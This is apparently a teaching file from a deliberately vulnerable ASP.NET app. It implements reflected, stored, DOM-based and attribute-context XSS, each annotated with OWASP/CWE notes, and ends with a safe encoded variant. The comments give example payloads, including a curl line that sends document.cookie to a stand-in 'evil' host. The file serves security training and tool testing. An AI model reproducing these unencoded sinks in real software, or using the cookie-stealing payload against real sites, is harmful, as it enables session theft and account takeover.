using Microsoft.AspNetCore.Mvc;

namespace VulnApp.Controllers;

/// <summary>
/// Cross-Site Scripting (XSS) — OWASP 2021 A03 Injection | OWASP 2025 A05 Injection.
///
/// Mirrors the SqlInjectionController annotation format and attribute-routed
/// action style. Every handler renders attacker-controlled input into an HTML
/// response (or client-side sink) WITHOUT contextual output encoding, so the
/// browser parses the payload as markup/script. The genuine dangerous sink for
/// C# here is string-concatenated HTML returned via Content(html, "text/html"):
/// unlike Razor (@ auto-encodes), raw Content() performs no escaping at all.
/// </summary>
[ApiController]
public class XssController : ControllerBase
{
    // In-process store for the stored-XSS demo. The Kestrel server is long-lived,
    // so a static List survives across requests (Go/C# note in the spec). Every
    // viewer of /injection/xss/comments re-executes whatever was persisted here.
    private static readonly List<string> XssComments = new();
    private static readonly object XssLock = new();

    // ========================================================================
    // PERMUTATION 1 — Reflected XSS in HTML body context
    // OWASP 2021 A03 Injection -> OWASP 2025 A05 Injection
    // CWE-79: Improper Neutralization of Input During Web Page Generation
    // EXPLOITATION LIKELIHOOD: CRITICAL — pre-auth, deterministic, no tooling; the
    //   textbook <script>alert(1)</script> executes in the victim's session the
    //   instant they open an attacker-supplied link (phishing/URL delivery).
    // PREVALENCE TODAY: greenfield LOW (Razor @-syntax and React/Angular/Vue
    //   auto-encode HTML by default) | legacy/10yr tech-debt HIGH (StringBuilder /
    //   Response.Write / Web Forms concatenating raw HTML is everywhere).
    // EXAMPLE: GET /injection/xss/hello?name=<script>alert(1)</script>
    // FIX: HTML-encode on output — System.Net.WebUtility.HtmlEncode(name) — or use
    //   a template engine that auto-encodes (see /injection/xss/hello-safe).
    // ========================================================================
    [HttpGet("/injection/xss/hello")]
    public IActionResult Hello(string name = "world")
    {
        // VULNERABLE: user input concatenated straight into the HTML body, unescaped.
        var html = $"<!doctype html><html><body><h1>Hello, {name}!</h1>"
                 + $"<p>Reflected without encoding. Echoed value: {name}</p></body></html>";
        return Content(html, "text/html");
    }

    // ========================================================================
    // PERMUTATION 2 — Stored (persistent) XSS
    // OWASP 2021 A03 Injection -> OWASP 2025 A05 Injection
    // CWE-79: Improper Neutralization of Input During Web Page Generation
    // EXPLOITATION LIKELIHOOD: CRITICAL — the payload is persisted once and fires
    //   for EVERY visitor with no interaction; ideal for session/cookie theft,
    //   admin-panel worming, and account takeover. Worst-case XSS class.
    // PREVALENCE TODAY: greenfield LOW (default-encoding view layers neutralise it
    //   on render) | legacy/10yr tech-debt HIGH (comment/profile/ticket fields
    //   round-tripped through raw HTML rendering).
    // EXAMPLE: curl -d 'text=<script>document.location="//evil/?c="+document.cookie</script>' \
    //            http://127.0.0.1:5001/injection/xss/comment
    //          then open GET /injection/xss/comments in a browser.
    // FIX: encode each comment on render, or sanitize/allow-list HTML on input.
    // ========================================================================
    [HttpPost("/injection/xss/comment")]
    public IActionResult Comment([FromForm] string text = "")
    {
        lock (XssLock) XssComments.Add(text ?? "");
        return new JsonResult(new { stored = text, count = XssComments.Count, render = "/injection/xss/comments" });
    }

    [HttpGet("/injection/xss/comments")]
    public IActionResult Comments()
    {
        var sb = new System.Text.StringBuilder();
        sb.Append("<!doctype html><html><body><h1>Comments</h1>");
        lock (XssLock)
        {
            foreach (var c in XssComments)
                // VULNERABLE: each stored comment rendered into HTML with no encoding.
                sb.Append($"<div class=\"comment\">{c}</div>");
        }
        sb.Append("</body></html>");
        return Content(sb.ToString(), "text/html");
    }

    // ========================================================================
    // PERMUTATION 3 — DOM-based XSS (client-side sink)
    // OWASP 2021 A03 Injection -> OWASP 2025 A05 Injection
    // CWE-79: Improper Neutralization of Input During Web Page Generation
    // EXPLOITATION LIKELIHOOD: HIGH — the tainted source (location.hash) never
    //   reaches the server, so it dodges WAFs and server-side filters; delivered
    //   by a crafted URL and fires purely in the browser. innerHTML with an
    //   onerror handler runs script even though <img>/<svg> aren't "script" tags.
    // PREVALENCE TODAY: greenfield MEDIUM (SPAs use safe bindings, but ad-hoc
    //   innerHTML/dangerouslySetInnerHTML still slips through) | legacy/10yr
    //   tech-debt HIGH (jQuery .html()/$(location.hash) patterns abound).
    // EXAMPLE: GET /injection/xss/dom#<img src=x onerror=alert(document.domain)>
    // FIX: use element.textContent (not innerHTML), or sanitize with a trusted
    //   library (e.g. DOMPurify) before assigning HTML.
    // ========================================================================
    [HttpGet("/injection/xss/dom")]
    public IActionResult Dom()
    {
        // The server returns a STATIC page; the vulnerability is entirely client-side.
        // VULNERABLE (client JS): location.hash is written to element.innerHTML.
        var html = @"<!doctype html><html><body>
<h1>DOM XSS demo</h1>
<div id=""out"">loading...</div>
<script>
  // Reads the URL fragment (never sent to the server) and injects it as HTML.
  var payload = decodeURIComponent(location.hash.substring(1));
  document.getElementById('out').innerHTML = payload;  // VULNERABLE sink
</script>
</body></html>";
        return Content(html, "text/html");
    }

    // ========================================================================
    // PERMUTATION 4 — Reflected XSS in an HTML ATTRIBUTE context (quote break-out)
    // OWASP 2021 A03 Injection -> OWASP 2025 A05 Injection
    // CWE-79: Improper Neutralization of Input During Web Page Generation
    // EXPLOITATION LIKELIHOOD: HIGH — even code that strips <tags> is bypassed by
    //   breaking out of the quoted attribute and adding an event handler; no angle
    //   brackets required, so naive "block <script>" filters don't help.
    // PREVALENCE TODAY: greenfield LOW-MEDIUM (auto-encoders handle attribute
    //   context too, but manual value="..." interpolation is a classic gap) |
    //   legacy/10yr tech-debt HIGH (hand-built form pre-fill markup).
    // EXAMPLE: GET /injection/xss/profile?name=%22%20onmouseover%3Dalert(1)%20x%3D%22
    //   (i.e. name=" onmouseover=alert(1) x=" — closes the value, adds a handler)
    // FIX: HTML-attribute-encode the value AND keep it inside quotes, e.g.
    //   value=""{System.Net.WebUtility.HtmlEncode(name)}"" (see profile-safe).
    // ========================================================================
    [HttpGet("/injection/xss/profile")]
    public IActionResult Profile(string name = "")
    {
        // VULNERABLE: value reflected inside a double-quoted attribute with no
        // encoding, so a literal quote in `name` terminates the attribute early.
        var html = $"<!doctype html><html><body><h1>Profile</h1>"
                 + $"<form><label>Display name: <input type=\"text\" value=\"{name}\"></label></form>"
                 + $"</body></html>";
        return Content(html, "text/html");
    }

    // ========================================================================
    // SAFE REFERENCE — contextual output encoding. Shown as the vulnerable/safe
    // pair so SAST tooling and learners can diff the sink. Both the body and the
    // attribute value are HTML-encoded on output, neutralising the payloads above.
    // ========================================================================
    [HttpGet("/injection/xss/hello-safe")]
    public IActionResult HelloSafe(string name = "world")
    {
        var encoded = System.Net.WebUtility.HtmlEncode(name);
        var html = $"<!doctype html><html><body><h1>Hello, {encoded}!</h1>"
                 + $"<form><input type=\"text\" value=\"{encoded}\"></form></body></html>";
        return Content(html, "text/html");
    }
}
